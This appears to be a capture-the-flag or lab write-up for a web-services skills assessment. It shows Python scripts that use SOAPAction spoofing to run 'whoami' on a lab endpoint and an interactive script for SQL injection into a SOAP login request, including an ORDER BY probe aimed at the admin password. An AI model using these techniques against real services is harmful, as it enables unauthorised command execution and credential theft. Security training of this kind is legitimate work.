# Skills Assessment

* Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise it will hang or throw an error.

<figure><img src="../../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (285).png" alt=""><figcaption></figcaption></figure>

Let us try a SOAPAction spoofing attack, as follows:

```
import requests
 
payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
 
print(requests.post("http://10.129.246.72:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

> We notice that thee is a `cmd` parameter. I’ll build a python script to issue requests:

<figure><img src="../../../.gitbook/assets/image (286).png" alt=""><figcaption></figcaption></figure>

So I’ll modify to perform a login request and do the SQLi -->

```python
import requests

while True:
    user = input("User: ")
    passwd = input("Passwd: ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>{user}</username><password>{passwd}</password></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://10.129.202.133:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
```

<figure><img src="../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>

Now, we can do the SQL Injection here --->

<figure><img src="../../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>

Nice! BUT... we need the flag... I will try to do `admin' ORDER BY 2--` -->

<figure><img src="../../../.gitbook/assets/image (289).png" alt=""><figcaption></figcaption></figure>
